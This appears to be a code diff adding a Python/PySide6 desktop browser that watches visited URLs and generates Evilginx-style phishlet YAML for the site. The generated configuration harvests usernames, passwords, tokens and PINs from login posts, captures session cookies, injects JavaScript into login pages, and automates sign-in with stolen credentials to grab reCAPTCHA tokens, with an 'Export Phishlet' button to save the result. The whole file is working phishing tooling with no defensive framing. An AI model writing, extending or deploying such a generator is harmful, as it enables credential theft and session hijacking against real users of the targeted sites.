@@ -1,0 +1,266 @@
+import sys
+import yaml
+from urllib.parse import urlparse
+from PySide6.QtWidgets import QApplication, QMainWindow, QVBoxLayout, QWidget, QLineEdit, QPushButton, QFileDialog, QMessageBox
+from PySide6.QtWebEngineWidgets import QWebEngineView
+from PySide6.QtCore import QUrl
+from PySide6.QtWebEngineCore import QWebEnginePage, QWebEngineProfile, QWebEngineUrlRequestInterceptor
+
+# Function to extract subdomain and domain from a URL
+def extract_subdomain_and_domain(url):
+    parsed_url = urlparse(url)
+    domain_parts = parsed_url.netloc.split('.')
+    
+    if len(domain_parts) >= 3:
+        subdomain = domain_parts[0]
+        domain = '.'.join(domain_parts[1:])
+        return subdomain, domain
+    else:
+        raise ValueError("URL does not contain a valid domain structure")
+
+# Function to generate a phishlet based on the request URL
+def generate_phishlet(request_url):
+    try:
+        subdomain, domain = extract_subdomain_and_domain(request_url)
+    except ValueError as e:
+        print(f"Error processing URL '{request_url}': {e}")
+        return None
+
+    proxy_hosts = [
+        {
+            "phish_sub": subdomain,
+            "orig_sub": subdomain,
+            "domain": domain,
+            "session": subdomain.startswith('login'),
+            "is_landing": subdomain.startswith('login'),
+            "auto_filter": True
+        }
+    ]
+
+    sub_filters = [
+        {
+            "triggers_on": request_url,
+            "orig_sub": subdomain,
+            "domain": domain,
+            "search": domain,
+            "replace": request_url,
+            "mimes": ["text/html", "application/json", "application/xhtml+xml"]
+        }
+    ]
+
+    auth_tokens = [
+        {
+            "domain": "." + domain,
+            "keys": ["session_token", "auth_token"],
+            "type": "cookie"
+        }
+    ]
+
+    credentials = {
+        "username": {
+            "key": "username",
+            "search": "(.*)",
+            "type": "post"
+        },
+        "password": {
+            "key": "password",
+            "search": "(.*)",
+            "type": "post"
+        },
+        "custom": [
+            {
+                "key": "token",
+                "search": "(.*)",
+                "type": "post"
+            },
+            {
+                "key": "pin",
+                "search": "([0-9]*)",
+                "type": "post"
+            }
+        ]
+    }
+
+    login = {
+        "domain": domain,
+        "path": "/login"
+    }
+
+    auth_urls = [
+        '/home'
+    ]
+
+    js_inject = [
+        {
+            "trigger_domains": [domain],
+            "trigger_paths": ["/login"],
+            "trigger_params": ["email"],
+            "script": """
+                function lp(){
+                    var email = document.querySelector("#username");
+                    var password = document.querySelector("#password");
+                    if (email != null && password != null) {
+                        email.value = "{email}";
+                        password.focus();
+                        return;
+                    }
+                    setTimeout(function(){lp();}, 100);
+                }
+                setTimeout(function(){lp();}, 100);
+            """
+        }
+    ]
+
+    intercept = [
+        {
+            "domain": domain,
+            "path": '^/report_error$',
+            "http_status": 200,
+            "body": '{"error":0}',
+            "mime": "application/json"
+        }
+    ]
+
+    evilpuppet = {
+        "triggers": [
+            {
+                "domains": [domain],
+                "paths": ['/sessions'],
+                "token": 'recaptcha_token',
+                "open_url": f'https://{domain}/signin',
+                "actions": [
+                    {
+                        "selector": '#email',
+                        "value": '{username}',
+                        "enter": False,
+                        "click": False,
+                        "post_wait": 0
+                    },
+                    {
+                        "selector": '#password',
+                        "value": '{password}',
+                        "enter": False,
+                        "click": False,
+                        "post_wait": 0
+                    },
+                    {
+                        "selector": '#stay_signed_in',
+                        "click": True,
+                        "post_wait": 0
+                    },
+                    {
+                        "selector": '#signin_button',
+                        "click": True,
+                        "post_wait": 0
+                    }
+                ]
+            }
+        ],
+        "interceptors": [
+            {
+                "token": 'recaptcha_token',
+                "url_re": '/sessions',
+                "post_re": 'recaptcha_token=([^&]*)',
+                "abort": True
+            }
+        ]
+    }
+
+    phishlet_data = {
+        "min_ver": "3.0.0",
+        "redirect_url": "https://www.linkedin.com/profile",
+        "proxy_hosts": proxy_hosts,
+        "sub_filters": sub_filters,
+        "auth_tokens": auth_tokens,
+        "credentials": credentials,
+        "login": login,
+        "auth_urls": auth_urls,
+        "js_inject": js_inject,
+        "intercept": intercept,
+        "evilpuppet": evilpuppet
+    }
+
+    try:
+        return yaml.dump(phishlet_data, default_flow_style=False)
+    except Exception as e:
+        print(f"Error converting to YAML: {e}")
+        return None
+
+# Custom page to intercept network requests
+class CustomWebEnginePage(QWebEnginePage):
+    def __init__(self, *args, **kwargs):
+        super().__init__(*args, **kwargs)
+        self.network_interceptor = NetworkInterceptor()
+        QWebEngineProfile.defaultProfile().setUrlRequestInterceptor(self.network_interceptor)
+
+# Network interceptor to capture HTTP requests
+class NetworkInterceptor(QWebEngineUrlRequestInterceptor):
+    def __init__(self):
+        super().__init__()
+        self.phishlet = None
+
+    def interceptRequest(self, info):
+        url = info.requestUrl().toString()
+        print("Intercepted URL:", url)
+        self.phishlet = generate_phishlet(url)
+
+# Main window for the browser application
+class Browser(QMainWindow):
+    def __init__(self):
+        super().__init__()
+
+        # Create widgets
+        self.browser = QWebEngineView()
+        self.page = CustomWebEnginePage(self.browser)
+        self.browser.setPage(self.page)
+        self.url_bar = QLineEdit()
+        self.search_button = QPushButton("Search")
+        self.export_button = QPushButton("Export Phishlet")
+
+        # Connect buttons
+        self.search_button.clicked.connect(self.navigate_to_url)
+        self.export_button.clicked.connect(self.export_phishlet)
+
+        # Set up layout
+        layout = QVBoxLayout()
+        layout.addWidget(self.url_bar)
+        layout.addWidget(self.search_button)
+        layout.addWidget(self.export_button)
+        layout.addWidget(self.browser)
+
+        # Create container widget
+        container = QWidget()
+        container.setLayout(layout)
+        self.setCentralWidget(container)
+
+        # Initialize the browser
+        self.browser.setUrl(QUrl("https://www.example.com"))
+        self.url_bar.setText("https://www.example.com")
+
+    def navigate_to_url(self):
+        url = self.url_bar.text()
+        self.browser.setUrl(QUrl(url))
+
+    def export_phishlet(self):
+        # Retrieve the phishlet data
+        if self.page.network_interceptor.phishlet:
+            phishlet_data = self.page.network_interceptor.phishlet
+            if phishlet_data:
+                # Open a file dialog to choose save location
+                file_dialog = QFileDialog(self, "Save Phishlet", "", "YAML Files (*.yaml)")
+                if file_dialog.exec():
+                    file_path = file_dialog.selectedFiles()[0]
+                    with open(file_path, 'w') as file:
+                        file.write(phishlet_data)
+                QMessageBox.information(self, "Export Successful", "Phishlet exported successfully!")
+            else:
+                QMessageBox.warning(self, "Export Error", "No phishlet data available to export.")
+        else:
+            QMessageBox.warning(self, "Export Error", "No phishlet data available to export.")
+
+# Main application
+if __name__ == "__main__":
+    app = QApplication(sys.argv)
+    window = Browser()
+    window.show()
+    sys.exit(app.exec())
